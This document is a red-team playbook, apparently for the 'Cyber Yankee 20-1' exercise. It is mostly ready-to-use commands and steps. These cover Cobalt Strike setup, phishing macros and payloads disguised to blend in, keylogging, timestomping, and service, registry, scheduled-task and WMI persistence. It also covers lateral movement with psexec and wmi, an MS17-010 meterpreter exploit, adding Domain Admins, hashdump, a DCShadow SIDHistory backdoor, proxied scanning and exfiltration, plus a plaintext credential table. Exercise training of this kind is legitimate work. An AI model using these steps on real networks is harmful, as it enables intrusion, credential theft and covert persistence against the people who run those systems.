# PLAYBOOK CYBER YANKEE 20-1
## Comms Checks
````
apt-get update && apt-get upgrade
 
Browse using FireFox
- http://10.0.0.1/tenants/cy20/content/red

- Download all 4 files
- mkdir tools
- cd tools
- mv ../Downloads/* .
- tar zxvf gunny.tar.gz

````
## Next instructions for HIGH TIER TEAMSERVER ONLY

````
apt-get install mingw-w64
cd tools/cobaltstrike/add-on/artifacts/
./build.sh

````


### ADD SUB-INTERFACE (REDIRECTOR)
### IP ADDR COMMAND
````
## Insert Interface setup script ##

ip addr add <ip/slash notation> dev <interface>

##  Delete IP Address
ip addr del <ip/slash notation> dev <interface>
````




## 1. SETUP COBALTSTRIKE

### Start TeamSever
````
./teamserver <IP> <password> <C2 PROFILE> 

Gunny will be hosting the C2 Profiles from his Kali Machine
````

### Start CobaltStrike
````
## In another terminal run the following. ##

./cobaltstrike

1. Enter name or call sign
2. Click <Yes>

## Please Read Cobaltstrike Playbook for a more comprehensive command list ##
````

### Create HTTP/HTTPS Listener
````
1. Select listener
2. Click Add
3. Name Listener (appropriate naming scheme)
4. Select Payload C2 Protocol i.e HTTP/S
5. Enter additional Hosts (use the plus button on the side)
6. Enter Host staging Domain Name or IP address
7. Enter Port number
8. Click Save

````
### Create SMB Listener
````
1. Select listener
2. Click Add
3. Name Listener (appropriate naming scheme)
4. Select Payload C2 Protocol i.e Beacon SMB
5. Enter Pipename (C2) (i.e sysmon_agent or winup64)
6. Click Save
````

## Create SpearPhishing Macro (APT 202)
````
1. Click Attacks
2. Click Packages
3. Click MS Office Macro
4. Select Listener
5. Click Generate
6. Follow additional Instructions (copy code to notepad move to windows machine with Excel installed)
7. Open excel file (on a windows machine only)
8. Save excel file
````

## Spear Phishing
````
- Add steps here (This will be setup with the help of the Range)

````



<div style="page-break-after: always;"></div>


# ONCE YOU GAIN INITIAL ACCESS
## SITUATION AWARENESS COMMANDS
### *APT 202 - LOW TIER*
````
## Default sleep time 5 mins ##
sleep 300 30

## Interactive mode when actions on objective ##
sleep 10 50
````

| *Commands*       |  *Win Event ID*     |  *Sysmon ID*  | API Command |      
|----------------|:-----------------:|----------------:|-------------:|
| ps            |  none          |      1  | No 
| shell ipconfig /all | N/A | 1 | No
| shell net user | N/A | 1 | No
| shell net share |  N/A | 1 | No
| shell net view | N/A | 1 | No
| shell net group "domain admins" /domain | N/A | 1 | No
| shell net group "domain controllers" /domain | N/A | 1 | No
| shell systeminfo | N/A | 1 | No
| shell sc query | N/A | 1 | No
| shell nltest /domain_trusts | N/A | 1 | No
| shell wmic qfe | N/A | 1 | No
| shell arp -a | N/A | 1 | No
| net computers  | none | none | Yes

### *APT 404 - HIGH TIER*
````
## Team Leads may adjust as operations require
## Default sleep time 10 mins ## 
sleep  600 30

## Interactive mode when actions on objective ##
sleep 30 50
````

| *Commands*       |   Event ID*     |  *Sysmon ID*  | *API Command* |      
|----------------|-----------------|----------------:|-------------:|
| ps             |  none          |      1  | Yes 
| net user | none | none | Yes
| net share |  none | none | Yes
| net view | none | none | Yes
| net group \\dc1 "domain Admins" | none | none | Yes
| net dclist | none | none | Yes
| net domain | none | none | Yes
| net domain_controllers | none | none | Yes
| net domain_trusts | none | none | Yes
| net logons | none | none | Yes
| net computers | none | none | Yes
| powerpick systeminfo | none | none | Yes
| powerpick get-service | none | none | Yes


## Keylogging - using CobaltStrike
````
## Explore.exe is a Good Process to Keylog ##
keylogging x64 <PID>
````
## EXE CREATION
````
1. Attack-> Packages -> Windows Executable (S)
2. Choose Listener (Workstation HTTP/S and Server SMB)
3. Output Windows Service EXE

Only choose x64 payload if you know the Arch of your target machine
4.Check x64 payload

5. Generate
6. Save (ensure the file name will blend in with the environment)

````
## SERVICE PERSISTENCE 
````
1. upload 
2. choose executable
3. shell dir <name of exe>
4. timestomp <payload> kernel32.dll
````
### LOW TIER
````
shell sc create <Service Name> binpath= <Path> start= auto error= ignore
shell sc query <Service Name>
shell sc start <Service Name>
### The service may fail, but execution of payload may have occured
````
### HIGH TIER
````
powerpick New-Service -Name "<servicename>" -BinaryPathName "C:\temp\payload.exe" -Description “<any_discription>"  -StartupType Automatic

powerpick Start-Service -Name "<service name>"
````

## REGISTRY PERSISTENCE
### Repeat EXE CREATION and steps 1-4 but choose a dll options
````
### User Level
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d " <path_to_executable> "
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <name> /t REG_SZ /d " <path_to_executable> "
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <name> /t REG_SZ /d "<path_to_executable>"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v <name> /t REG_SZ /d " <path_to_executable> "
````

````
### System Level
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d "<path_to_executable>"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <name> /t REG_SZ /d "<path_to_executable>"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <name> /t REG_SZ /d "<path_to_executable>"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v <name> /t REG_SZ /d "<path_to_executable>"

````

## SCHEDULED TASK
````
schtasks /create /sc ONLOGON /tn <TaskName> /tr <Path_To_Executable>
````

## HIGH TIER PERSISTENCE WMI EVENT REGISTRATION
````
powershell-import <Path to PowerLurk.ps1>
powershell Get-WMIEvent

upload <Path to malicous payload>
timestomp <payload> kernel32.dll

### upload PowerLurk to attack platform ##
````

## LATERAL MOVEMENT - using CobaltStrike
````
jump psexec_psh <IP> <SMB Listener>
jump psexec <IP> <SMB Listener>
jump wmi <IP> <SMB Listener>

## Old School Method
upload <executable/dll>
shell copy <executable/dll> <Remote Location>
wmic /node:ComputerName process call create "cmd.exe /c <executable/dll>"
````

# SETUP METASPLOIT
````
msfdb inite 
msfconsole
````



## AUXILIARY/SCANNER/SMB/SMB_M17_010
````
1. use exploit/windows/smb/ms17_010_psexec
2. options
3. set RHOSTS <IP>
4. set payload windows/x64/meterpreter/bind_tcp
5. set LPORT <PORT NUMBER>
6. exploit -j
````

## SETUP MSF SOCK PROXY
````
### On CobaltStrike 
1. sock <choose a port>

### In MSF Terminal
2. setg Proxies socks4:127.0.0.1:<RHP>
````

## AUXILIARY/ADMIN/SMB/MS17_010_COMMAND
````
1. set command net group \"Domain Admins\" <USERNAME> /add /domain
2. set rhosts <IP's>
3. exploit -j
````


## METERPRETER COMMANDS

````
ps
ipconfig 
whoami
hashdump || run hashdump
````

## ACTIVE DIRECTORY DC SHADOW BACKDOOR  
### FROM A WORKSTATION
### *System Access*
````
1. Attacker obtains Domain Admins rights
2. Mimikatz register as Domain Controller in AD
3. Make replication change
4. Trigger Replication
````

````
powershell-import <Path to DCShadowPermissions.ps1>

powershell Set-DCShadowPermissions -FakeDC <computer name> -ADPATH "LDAP://CN=AdminSDHolder,CN=System,DC=<DOMAIN>,DC=<DOMAIN>,DC=<DOMAIN>" -Username <username> -Verbose

mimkatz lsadump::dcshadow /object:<username> /attribute:SIDHistory /value:<DOMAIN ADMIN SID WITH RID OF - 512>

Example: S-1-5-21-2102128754-2500892452-41739376602-512
````

### FROM A WORKSTATION
### *User/Admin Access*
````
shell whoami /user
mimikatz lsadump::dcshadow /push
shell dir \\<Domain Controller IP>\C$
````


## COMPRESS FILE
````
makecab <file name>
OR
powerpick Compress-Archive –path <path_to_file> -destinationpath <path>
````

## DIRECTORY SEARCH
````
shell tree <PATH> /A /F
OR
powerpick Get-ChildItem –path <path> -Recurse –Erroraction silentlycontinue | Export-Csv –Path <path>

````

## DATA EXFIL
````
download <file path>
````

## SCADA CREDS & TARGET

| UserName       |  Password     |  Computer |
|----------------|:-----------------:|:-----------|
| users | BlueTeam1          | 123.123.123.123 |


## Clear Memory of Kerberos Tickets
````
shell klist purge
````

## Proxychains Scanning 
### Use only TCP Protocol

````
## Port 9050 is the default port for ProxyChains ##
### Change port
nano /etc/proxychains.conf
proxychains nmap -Pn -n -sT <IP Range>
````


## Registry Keys of Interest
# WDIGEST

# REMOTE SERVICES

# PREFETCH


